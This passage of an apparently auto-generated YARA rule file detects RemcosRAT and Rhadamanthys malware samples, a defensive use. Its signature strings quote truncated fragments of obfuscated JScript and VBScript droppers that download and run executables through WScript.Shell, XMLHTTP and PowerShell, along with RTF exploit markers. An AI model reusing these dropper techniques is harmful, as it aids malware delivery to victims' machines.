      $s11 = "0targetBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%2520%257B%250A%2520%2520%2520%2520%2520%2520%252" ascii /* score: '14.00'*/
      $s12 = "57D%250A%250A%2520%2520%2520%2520ModeOfOperationCFB.prototype.encrypt%2520%253D%2520function%2528plaintext%2529%2520%257B%250A%2" ascii /* score: '14.00'*/
      $s13 = "20%2520%2520%257D%250A%250A%2520%2520%2520%2520ModeOfOperationECB.prototype.encrypt%2520%253D%2520function%2528plaintext%2529%25" ascii /* score: '14.00'*/
      $s14 = "%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520ModeOfOperationCBC.prototype.encrypt%2520%253D%2520function%2528plaintext%2529" ascii /* score: '14.00'*/
      $s15 = "0%2520%2520%2520%2520%2520sourceBuffer.copy%2528targetBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%2" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x733c and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__b7166b32 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b7166b32.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b7166b32928d48798102b536b43f3ee75db1968eade2388a22b94bfc007854e2"
   strings:
      $x1 = "document.write(unescape(\"%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%253Chtml%253E%250A%253Chead%253E%250A%253Cti" ascii /* score: '46.00'*/
      $s2 = "%2520http%253A//ixti.net/development/javascript/2011/11/11/crannocks-encodedecode-of-utf8-in-browser-with-js.html%250A%2520%2520" ascii /* score: '23.00'*/
      $s3 = "OfOperationCTR.prototype.encrypt%253B%250A%250A%250A%2520%2520%2520%2520//%2520The%2520basic%2520modes%2520of%2520operation%2520" ascii /* score: '17.00'*/
      $s4 = "520%2520SYSMENU%253D%2522no%2522%250A%2520%2520WINDOWSTATE%253D%2522minimize%2522%253E%250A%253C/head%253E%250A%250A%253Cscript%" ascii /* score: '15.00'*/
      $s5 = "document.write(unescape(\"%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%253Chtml%253E%250A%253Chead%253E%250A%253Cti" ascii /* score: '14.00'*/
      $s6 = "2520%2520%2520%2520targetBuffer%255BtargetStart++%255D%2520%253D%2520sourceBuffer%255Bi%255D%253B%250A%2520%2520%2520%2520%2520%" ascii /* score: '14.00'*/
      $s7 = "A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520ModeOfOperationCTR.prototype.encrypt%2520%253D%2520function%2528plaintex" ascii /* score: '14.00'*/
      $s8 = "%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528targetStart%2520%253D%253D%2520null%2529%2520%257B%2520target" ascii /* score: '14.00'*/
      $s9 = "2520%2520%2520%2520sourceBuffer.copy%2528targetBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%253B%250" ascii /* score: '14.00'*/
      $s10 = "3B%2520%257D%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520copyBuffer%2520%253D%2520function%2528sourceBuffer%252C%2520target" ascii /* score: '14.00'*/
      $s11 = "Buffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%" ascii /* score: '14.00'*/
      $s12 = "ion%2528sourceBuffer%252C%2520targetBuffer%252C%2520targetStart%252C%2520sourceStart%252C%2520sourceEnd%2529%2520%257B%250A%2520" ascii /* score: '14.00'*/
      $s13 = "ModeOfOperationCBC.prototype.decrypt%2520%253D%2520function%2528ciphertext%2529%2520%257B%250A%2520%2520%2520%2520%2520%2520%252" ascii /* score: '14.00'*/
      $s14 = "%2520%2520%257D%250A%250A%2520%2520%2520%2520ModeOfOperationOFB.prototype.encrypt%2520%253D%2520function%2528plaintext%2529%2520" ascii /* score: '14.00'*/
      $s15 = "this.key.length%2520/%25204%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520//%2520convert%2520the%2520key%2520into%2520in" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x733c and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__11 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "28c742e06c50726b0df3571ceb02d98e834efc53cefb386f18fef1dabbc038c0"
   strings:
      $x1 = "Herli.ShellExecute(\"explorer.exe\",Over + \"\\system32\\MRT.exe\",\"\",\"open\",0);" fullword ascii /* score: '37.00'*/
      $s2 = "//Sphaerobolus; klodesky; varmefyldernes virgulariidae126: oxpecker echoizing; festsange pluralise benumbingly recounts: skokkev" ascii /* score: '28.00'*/
      $s3 = "Bumbazec = Over + '\\\\system32\\\\WindowsPower'+Gynecocrat+'hell\\\\v1.0\\\\power'+Gynecocrat+'hell.exe';" fullword ascii /* score: '28.00'*/
      $s4 = "ise kamillo, deviator? efterbevilligede pneumonolysis: armlnet cauldron nondumping compter kommuneplanloves forgifte pelletise i" ascii /* score: '25.00'*/
      $s5 = "//Staalrrsstolen agonizedlies; supplementsbindenes; incorpsing56! espacement; forfladigende? afknappe: bewrayed254: stttepillens" ascii /* score: '23.00'*/
      $s6 = "spin.Item(0).Document.Application.ShellExecute(Bumbazec,String.fromCharCode(34)+Foyersbay+String.fromCharCode(34),\"\",\"open\"," ascii /* score: '21.00'*/
      $s7 = "//Malinvestment? sociolekternes crystalitic, attractor? filaricidal: antidumpingregler residentiaryship. demarkeringer personkre" ascii /* score: '21.00'*/
      $s8 = "artanas slarier! perceivedness. flanen! sygemeldingers davidsstjernes processer; milieuadministrationen: consolute! energiagentu" ascii /* score: '20.00'*/
      $s9 = "//Uddeliggrer198 spreadhead? mealtime disimitation; counterdoctrine electroencephalogrammes licensing landbrugskrise? tsarina, s" ascii /* score: '20.00'*/
      $s10 = "//Latticinio; paintjet. farmakope lkrig? neika192 photonic238 tenours migniard verandah? trkgrundlagets xylograferet. alfaje bin" ascii /* score: '20.00'*/
      $s11 = "//Steriliseringers134 buzzwords rygeren. skruestiksbnkenes deliberating. humlebiens situation afhnder uncommercialness simplifie" ascii /* score: '19.00'*/
      $s12 = "//Frihandelsomraaders fljetonerne brneradio regionplanchefens spolinger? unchristianized, nursery withslip uforsonligstes98 kron" ascii /* score: '19.00'*/
      $s13 = "//Breviloquence eksportaktiviteten mettemaries kopekers: mahajan, indstuktionsafvikling131 precession forudstte. decontrol tirre" ascii /* score: '18.00'*/
      $s14 = "//Katrineblommes bygningsfejlen: udbasunere cyclometrical? inapostate kammerdug; diagnostikkerne: kochliarion. oktettens letterl" ascii /* score: '18.00'*/
      $s15 = "//Sisith! smmende jerryism? raintight. alarmurenes. fritidsfiskers96 dropsies: modsiges tempererendes, postseasonal? raadighedsb" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__12 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "52824fad8d4559d2442ffa39a6ce123f99eb11b214fa9705a04968b6844118f9"
   strings:
      $s1 = "Bncqtuwnitfqrgk.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule RemcosRAT_signature__13 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).rtf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "976744001d8f9f316ceed384ac698494f21fd758e8f874e06e287d0d7f87ca92"
   strings:
      $s1 = "006571754174694f6e2e33" ascii /* score: '17.00'*/ /* hex encoded string 'equAtiOn.3' */
      $s2 = "6571754174694f6e2e33" ascii /* score: '17.00'*/ /* hex encoded string 'equAtiOn.3' */
      $s3 = "i83kTN4hn1a2Nk8Vz8U0yyyy7eozj6tgxejuNPc3ph6kSsil4Jt6ieCPVQjchdup1xLVEt7lzIA6sCzEmkhHTY46L680ccnZZ4opBKzeupeMoEMgpWnoOA1rHjxSbbzg" ascii /* score: '14.00'*/
      $s4 = "{\\*\\aulnone357434566 \\bin000000\\357434566762221570 fnduRemaD95TNQGEYt5KohCe5KCEuVyCLLGACjUeVvsq9Xghtau8Yx0YSx0e9KsLJG3A1qIeB" ascii /* score: '12.00'*/
      $s5 = "5373928c2dcb1b997373c4ebcc9c0f1541f644e2e0008703a8fb387b2e3d973cf98adf3ede64ade9556504cdece09a333bf2628b242585acf317cf1073b77abb" ascii /* score: '11.00'*/
      $s6 = "027c94dd7dd8924270499e85f4b39000290b10514e84af77bb752a6f77a6fc4c6c0a68129e747ee2c66e278afbc7d82c12e8e7811aeddce6df7fdb23e2e91374" ascii /* score: '11.00'*/
      $s7 = "9372225bcb668a714a57e52ad818615056806155f9a6b88e852cf26f96718bdadbdd334a5a1b1026a757fbf83087c4a9729d67c941d55ece04edd152f767dc4e" ascii /* score: '11.00'*/
      $s8 = "6a35a2f21de4d7d2f691ba07f744950049c15fedf0939ed199ef669357d4346853248cbd13de9a7399656096c00e2a3de7997d002844127ab62efc9c90fc6db8" ascii /* score: '11.00'*/
      $s9 = "0F0yHzR49EQBnTJsulpUoCPKordBur3yebBiGSlk4XIA6mlW2GhlHoSVNqdNgNypDPG1nVe1UbBJA3WTU2z4x4oyLtghMRTDUKGnAHcHB38XHS882kiI7817Ueo3DE4V" ascii /* score: '11.00'*/
      $s10 = "ffffff0cb2cf00ba3dc87787918d58f4a84c7b01892d64ae3cfbfefbcc49cde88d546775791a254aa0fc466fba0cb3b88beb569b74cf7fc154a2c09f74482459" ascii /* score: '11.00'*/
      $s11 = "5a2a00005e9d81e9f920000050588db1150f00005e59905a9d565e81c38d5e5f12535beb0206da90565ee920ffffff83c204525ae911ffffffebf439f20f8240" ascii /* score: '11.00'*/
      $s12 = "8fa38932420d9b1210342bc74ff4097c8970200ecebecdee9f74f85126205a42358c0cdff066deb224d63aafbd73d2727fa0ff596e83e4b8768824238a66c549" ascii /* score: '11.00'*/
      $s13 = "65f3b06fc68df0a5f350bf4695d74723db41d9e3069c429ebe4a476f5eb264d8af57484131ef2e922c22b133387234451e384cd9a5de9f865a32edd30facb6c0" ascii /* score: '11.00'*/
      $s14 = "9e48174d04edabad3329e3472709a9d137bfc9b909363b1aabcf7aec74b8d37e5ee99065cdc44a30f4a274234c448cd96dbcc3f92907e533e1cf01f0520cd290" ascii /* score: '11.00'*/
      $s15 = "16eb3807f1302972d8b92c67b3d8d5d4bb4c2ce10dd6148eac2fb7db9dddf0c8b4080555ec67f9c71c507d4fe129776cfec033c97867f31fdd4b9eb7224538de" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5c7b and filesize < 30KB and
      8 of them
}

rule RemcosRAT_signature__14 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "618cffa5d344e3510f14f20dc765f4742bb04ce020f5162ca8e4f73aae5f29c4"
   strings:
      $x1 = "%TEMP%','WScript.Shell','352DvWChP','.exe','5REvscD','Run','random','CreateObject','8066639USNlrq','258492phaMwY','charAt','ADOD" ascii /* score: '35.00'*/
      $x2 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '34.00'*/
      $s3 = "B.Stream','NameSpace','Open','10369752WnRWAl','Scripting.FileSystemObject','GET','CopyHere','6493698hCTDxZ','Shell.Application'," ascii /* score: '13.00'*/
      $s4 = "0000002" ascii /* reversed goodware string '2000000' */ /* score: '11.00'*/
      $s5 = "m);}function e(m){var y=b;return m[y(0x154)](y(0x164));}function f(m,n,o){var z=b;return m[z(0x150)](n,o);}function g(m){WScript" ascii /* score: '10.00'*/
      $s6 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '9.00'*/
      $s7 = "return m['GetExtensionName'](n)[E(0x14a)]()==='exe';}c();}()));" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4353 and filesize < 30KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__a99d2210 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_a99d2210.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a99d2210c8b7a4b9c3a57c0100741b183de45eab668bb6df1d20e28f4335f68d"
   strings:
      $x1 = "%TEMP%','WScript.Shell','352DvWChP','.exe','5REvscD','Run','random','CreateObject','8066639USNlrq','258492phaMwY','charAt','ADOD" ascii /* score: '35.00'*/
      $x2 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '34.00'*/
      $s3 = "B.Stream','NameSpace','Open','10369752WnRWAl','Scripting.FileSystemObject','GET','CopyHere','6493698hCTDxZ','Shell.Application'," ascii /* score: '13.00'*/
      $s4 = "m);}function e(m){var y=b;return m[y(0x154)](y(0x164));}function f(m,n,o){var z=b;return m[z(0x150)](n,o);}function g(m){WScript" ascii /* score: '10.00'*/
      $s5 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '9.00'*/
      $s6 = "return m['GetExtensionName'](n)[E(0x14a)]()==='exe';}c();}()));" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__15 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).x"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3325522aead0cb144da36cbb1950bb763e94e9327bbf3ac9d7cdb89a4a38a8b9"
   strings:
      $x1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x80;var h=e[f];return h;},b(c,d);}(function(c,d){var v=b,e=c();while(!![])" ascii /* score: '34.00'*/
      $s2 = "'Type','BuildPath','exe','Write','9768681USgIbV','%TEMP%','Delete','send','Shell.Application','.zip','ADODB.Stream','CreateObjec" ascii /* score: '19.00'*/
      $s3 = "t','2HjRxhP','8904xDcGNH','open','FolderExists','floor','moveNext','NameSpace','SaveToFile','GetExtensionName','WScript.Shell','" ascii /* score: '17.00'*/
      $s4 = "JKLMNOPQRSTUVWXYZ','GetFolder','Name','5580765ULGYiV','length','1853670xtWDxc','charAt','1209587XztIbR','item','atEnd','status'," ascii /* score: '14.00'*/
      $s5 = "GET','MSXML2.XMLHTTP','2611iROqZZ','Run','3021690xbenfT','Sleep','Open','Files','toLowerCase','Scripting.FileSystemObject','3075" ascii /* score: '14.00'*/
      $s6 = "0000002" ascii /* reversed goodware string '2000000' */ /* score: '11.00'*/
      $s7 = "712xBCwKz','random','responseBody','.exe','Close'];a=function(){return G;};return a();}" fullword ascii /* score: '11.00'*/
      $s8 = ",o){var z=b;return m[z(0xaa)](n,o);}function g(m){var A=b;WScript[A(0x93)](m);}function h(m){var B=b,n=B(0x9e),o='';for(var p=0x" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6e49 and filesize < 30KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__c2d96561 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_c2d96561.gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c2d96561b56c2f498274a21dacf2acbcfee66257f9f2149b979b61082312eb7f"
   strings:
      $x1 = "function a(){var D=['item','424089paNIwT','Files','Delete','Close','79736ZOsdVF','.exe','146048oBxHxC','atEnd','charAt','Shell.A" ascii /* score: '34.00'*/
      $s2 = "function a(){var D=['item','424089paNIwT','Files','Delete','Close','79736ZOsdVF','.exe','146048oBxHxC','atEnd','charAt','Shell.A" ascii /* score: '21.00'*/
      $s3 = "TTP','Run','11115624oWoCYh','CreateFolder','open','170tcBWgz','WScript.Shell','GET','Name','Items','random','31357161JFcGUU','ex" ascii /* score: '17.00'*/
      $s4 = "0000002" ascii /* reversed goodware string '2000000' */ /* score: '11.00'*/
      $s5 = "','length','ExpandEnvironmentStrings','GetFolder','8986800ZVlVaM','send','GetExtensionName','FolderExists','status','MSXML2.XMLH" ascii /* score: '9.00'*/
      $s6 = ".zip',r=h(0x6),s=f(n,o,q),t=f(n,o,r);i(p,s)&&(j(n,s,t)&&(g(0x5dc),k(n,m,t)));}catch(u){}}function d(m){return WScript['CreateObj" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x554f and filesize < 30KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__4171ca8d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_4171ca8d.gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4171ca8d528cc45a473ddbf3f05c25967eb58bbe68c0c1bec48722f2d2036bc8"
   strings:
      $s1 = "SCAN_003881610041_16-09-2025.tar" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 4KB and
      all of them
}

rule RemcosRAT_signature__6fef8e3b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6fef8e3b.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6fef8e3be1ebc251bb4d064464d31c96befff29542bbd7c5b281464d24a2a4a0"
   strings:
      $s1 = "Verniemonologueaft = Command " fullword ascii /* score: '19.00'*/
      $s2 = "Set Rustningen = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")" fullword ascii /* score: '19.00'*/
      $s3 = "Call Sotie.ShellExecute(Tetraglottic & Nonrestrictively, Larboard, \"\", \"\", Skarpskytternes)" fullword ascii /* score: '18.00'*/
      $s4 = "Rem Styringscomputerens nuthouses! dumperfrers?" fullword ascii /* score: '17.00'*/
      $s5 = "Rem Tempelridderes superfunctional136, netvinget! pinuela nonnens!" fullword ascii /* score: '16.00'*/
      $s6 = "Private Const Embarkations = \"kollegers etageejendomme:\"" fullword ascii /* score: '15.00'*/
      $s7 = "Wingedvivisektione = Trim(\"Udvlgelsesprocesserne\") " fullword ascii /* score: '15.00'*/
      $s8 = "Polyhedraklargringe = Command " fullword ascii /* score: '14.00'*/
      $s9 = "Bitangentialunphoneticn = Command " fullword ascii /* score: '14.00'*/
      $s10 = "Clr = Clr + \"Get-DiskpdfNV;function licentiates ($antiplenist){ $disfranchisements156=1;do {$eksorbitant+=$antiplenist[$disfran" ascii /* score: '13.00'*/
      $s11 = "Private Const Entropium = -50243" fullword ascii /* score: '13.00'*/
      $s12 = "Private Const Preludises37 = -30487" fullword ascii /* score: '13.00'*/
      $s13 = ";$milkwoods=licentiates '~h~t~tdocp s~:doc/~/ i,t - i~n g~doc~h r /~T~r i~l~l i ndocg~s doc s~e,a >~h~t t~p~s : / /~s~e r r~a~l~" ascii /* score: '12.00'*/
      $s14 = "BqAqldoc:qUqn p rqo pqh E T i Cq=q(qT E pdfqt - Pqa tqhq q$qt Udocu mq)') ;Unwell (licentiates 'h$docG,L ohBha lh: A F,l bdocpdf" ascii /* score: '12.00'*/
      $s15 = "$}t}u u m )';$tuum=$spacesuit;Unwell (licentiates 'p$pGplpOpb a L :pUpNdocp rpOpp HpEptpIpC = (pT E s t - P A T Hp p$pt UpU m )'" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7553 and filesize < 100KB and
      8 of them
}

rule RemcosRAT_signature__8a9a994b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_8a9a994b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8a9a994b888985e7e31318140774631353ede64aab7237a277f84cd374939521"
   strings:
      $x1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x80;var h=e[f];return h;},b(c,d);}(function(c,d){var v=b,e=c();while(!![])" ascii /* score: '34.00'*/
      $s2 = "'Type','BuildPath','exe','Write','9768681USgIbV','%TEMP%','Delete','send','Shell.Application','.zip','ADODB.Stream','CreateObjec" ascii /* score: '19.00'*/
      $s3 = "t','2HjRxhP','8904xDcGNH','open','FolderExists','floor','moveNext','NameSpace','SaveToFile','GetExtensionName','WScript.Shell','" ascii /* score: '17.00'*/
      $s4 = "JKLMNOPQRSTUVWXYZ','GetFolder','Name','5580765ULGYiV','length','1853670xtWDxc','charAt','1209587XztIbR','item','atEnd','status'," ascii /* score: '14.00'*/
      $s5 = "GET','MSXML2.XMLHTTP','2611iROqZZ','Run','3021690xbenfT','Sleep','Open','Files','toLowerCase','Scripting.FileSystemObject','3075" ascii /* score: '14.00'*/
      $s6 = "712xBCwKz','random','responseBody','.exe','Close'];a=function(){return G;};return a();}" fullword ascii /* score: '11.00'*/
      $s7 = ",o){var z=b;return m[z(0xaa)](n,o);}function g(m){var A=b;WScript[A(0x93)](m);}function h(m){var B=b,n=B(0x9e),o='';for(var p=0x" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__9527432c {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_9527432c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9527432c5ba45d4c7e06110b005daa284e21b48286d3e6b40f85901a9ed4dffd"
   strings:
      $s1 = "qtcreator.exe" fullword wide /* score: '22.00'*/
      $s2 = "XXXZXYXZZ" fullword ascii /* base64 encoded string ']vWavY' */ /* score: '16.50'*/
      $s3 = "ZXZYZXZXZ" fullword ascii /* base64 encoded string 'evXevW' */ /* score: '16.50'*/
      $s4 = "BZXZZXXZZ" fullword ascii /* base64 encoded string 'evY]vY' */ /* score: '16.50'*/
      $s5 = "ZYYYXX" fullword ascii /* reversed goodware string 'XXYYYZ' */ /* score: '13.50'*/
      $s6 = "ZZZYZX" fullword ascii /* reversed goodware string 'XZYZZZ' */ /* score: '13.50'*/
      $s7 = "ZYYXXX" fullword ascii /* reversed goodware string 'XXXYYZ' */ /* score: '13.50'*/
      $s8 = "A\\A\\A\\" fullword ascii /* reversed goodware string '\\A\\A\\A' */ /* score: '11.00'*/
      $s9 = "ZYYYYZZX" fullword ascii /* score: '9.50'*/
      $s10 = "YYYYYXYZX" fullword ascii /* score: '9.50'*/
      $s11 = "RXYYYYZY" fullword ascii /* score: '9.50'*/
      $s12 = "YYYZYYYYZXX" fullword ascii /* score: '9.50'*/
      $s13 = "YXXYYYYXYZY" fullword ascii /* score: '9.50'*/
      $s14 = "The Qt Company Ltd." fullword wide /* score: '9.00'*/
      $s15 = " 2008-2025 The Qt Company Ltd." fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule RemcosRAT_signature__0498bb46 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_0498bb46.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0498bb467a4bca35292238120d76794701333a259f668f31ac75b1e2f79857a9"
   strings:
      $s1 = "#* ,n'" fullword ascii /* score: '9.00'*/
      $s2 = ";~+]7B--[" fullword ascii /* score: '9.00'*/ /* hex encoded string '{' */
      $s3 = "oeyizam" fullword ascii /* score: '8.00'*/
      $s4 = "YBwS4O5*- ;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 23000KB and
      all of them
}

rule RemcosRAT_signature__05e44771 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_05e44771.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05e4477179c7e4a72fbdfb2ab5cd7d641fd869dc932dd316e7c9f3c35c6931ab"
   strings:
      $x1 = "H4sIAAAAAAAEAOy3Y3Sl3bYuOmPbdiq27Uoqtiq2nVTsiu1UbNu2bdu2cfN9a6291zl7n9b2/XV/3DPeNkYfXU9/Rh+zzXdOAOD/jv//DQafrwUWgOjz/zKPz9VS38rI" ascii /* score: '79.00'*/
      $s2 = "PcIALjw1MebiRLEdLLqUnPfOd+3LxWuI58X8hEC6/6+ntyn77dBPQ4ioRgDZEpzOSu+birfK0vnd5yc4ITQEmWwjLlOGQnLo+3SzvGTmT8WL3C1a3QsG/hyH8VPLVU3m" ascii /* score: '21.00'*/
      $s3 = "EzaI4RPJ8Q46OMxzjI7+4IgidjInY1z1K2V3R2IRCt6HeiaE/ILtWexIKNU3Xw63fFEdqnT6RCKTk158YCZ+sPYcvaHqtfe+PYtnYyuI/x5c58mHpCsjDpttwucq6Ju3" ascii /* score: '21.00'*/
      $s4 = "ejZWbfa/ObIYpwwb+zXhApRf3r61jmKyXMIQv/H+h135bT1nkzMBsLlAoVAY97z9vS7dUMPUZpMUbru6RTde3KOvd7uzPZBFzZ+riILSs/UFWJdH4PHT2Se2qBWCgYIn" ascii /* score: '21.00'*/
      $s5 = "gDZ1H2pi/A2aCssapig/LpscezLgIPN8XzNW7rXezNdAFlHfo1woSaNdKa1d8rRk53Jb9MNO7xdNvE8UVkzX2nEyeLETeb7zTqSLl2ygeTdjas7nozVJsjhyKIhvYHPi" ascii /* score: '21.00'*/
      $s6 = "WTLuR51ExkFzxcLX/pnImcIqfB1eIrc7shJ11FMD4NKmh/lrbNvqC2D/0Z2sabloGBhhjfBdDQHDqrg4rELrc3nnBiJTR8R4heTZznFc4VFxuv1ROZ1gvyhi2Rc908De" ascii /* score: '21.00'*/
      $s7 = "yhqJo+bxLTg3mPcbcQ74z62TjnRd2cCMDh7aANnVDbXCLRCnGQlJqZ65Bdw37iumTKuNx9ASBJYpdspyQVJ7ovGtfwR3XGc6bH6RIrbiyP1e/s24x9M/dF+/N7npM8Zr" ascii /* score: '19.00'*/
      $s8 = "iZRoBOiRcF89TCkjvly20HtdaKukZ60rRct4Jtxc5dKnBiNb0VGJC6IzrAC8OnBGQ0BOk2zjSlS8QavceZzbYLHkb1+7pWigG4Ii2s4EaHEtRMhjRxTnsmHnGi+YedKI" ascii /* score: '19.00'*/
      $s9 = "XWGjpvsQmF+visb9YcqEkeqb+u1to8SmBQ2PcLgkcEhtgNo1IOwnij/AUIgdoXFSYjfuZq6Q4k7FRuPgyd62Zglu/wDN8K9rw5H+k6PULXDhXeIeW5skEYelc06UYJDM" ascii /* score: '19.00'*/
      $s10 = "1abmi6RwgffCXmZpptcShReOFtP9gJRUncJdA0iWcRgoAfYi87JcYaN4tuohueiIKntCeqcd0ORHAcxZDhyhzQEFSSUQnnU1TtP85+ak7+ImAtV91fGSSPdL67miM9Rl" ascii /* score: '19.00'*/
      $s11 = "LbiS70rQpmd1tS+Ye1/TydcZypUMlYRKEYE/75gMEXaQQN6Ux29rYjvyGStUFQU+vuyjOvbAA1Q4ejFXf9GJUKZbKybVQCLU0STVI9HBqL6VsXM7NYq0q3oO7hkj6RD1" ascii /* score: '19.00'*/
      $s12 = "xERsBHKnfq70U/nBebUAgwPITlu7WgrdhT585ga0aa7XmQKikk70v9bp6fCunqadJTcmDyyrSGETalWfKHBGgmY7Oalh7BX2N8wZsVFuYvYtujj8Fg20aA8L54R+taXR" ascii /* score: '19.00'*/
      $s13 = "i9hTMpcPUKJD5ww4DwcL0QvGEIj0HedTh0SXntuhzZiMfrhdLLFdf3gYZDkYWfbcZ1ka/t6tZB/ZojDN9fnvo2RLMzTEdXMyVuQ1fsjvlxFSAQD9/QFecNR1odfxGyIT" ascii /* score: '19.00'*/
      $s14 = "J2JCnyE43jvHxZN+0k+vBg6+reRDp5VVTtJSDMCEsBrePfNRG9WnkAk/+xfczJSf2bH8oNPJsiZf/djEPZ90NIP7ldT35NCF2dEYJad4IpI1dxlOgoNJyzH6uzcW41II" ascii /* score: '19.00'*/
      $s15 = "KuHcYJ+O2ZtsuaFxW/99E5uENW3zIB2EMJetOgr6AXOejUx+RQH0ZFLYVtCc4OR75hVUqWhLv6t6hcrPt/GtMPih1Qlp4VrWwuM/1WZslVElEmcvu3cGeTaXe4+roNIp" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6340 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__ec26a91a {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_ec26a91a.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ec26a91affda77162826cbc53cdbbac0839202267d790624fad20866b0b9c191"
   strings:
      $x1 = "H4sIAAAAAAAEAOy2Y3SmTbcu+sS2bbvjdGynY6djq2Pbtm13bNu2bXfMk/f9sNfaa+091s8zxjlVo2bdU9e8atb9AAD4/8f/9war7peABSDa/l9ieF0t9a2M7O31GLih" ascii /* score: '77.00'*/
      $s2 = "4s/PP6tl26YtPd+eV+//UAqsgmQ+In6H0QCNe4lhQsIRccrn5IMw1fq198bUjK58IoPY5vhkEcycDfKS/7QnLoGnSWc0/k+rm4IJehBs4DwEmPDAlT17YBih0ek9BSq9" ascii /* score: '21.00'*/
      $s3 = "0c+NO2Dhx0PJQxershKC+D+a/dDqHRu5i/Fqgm31/rk3oo9rr8R2Dx/D0pop5tRTPzgf3abd3zvJOmVbXDPvlZpQeZedUmpW8KTvbAxMAlHwxVHit8cixE1dEU0dQq0X" ascii /* score: '21.00'*/
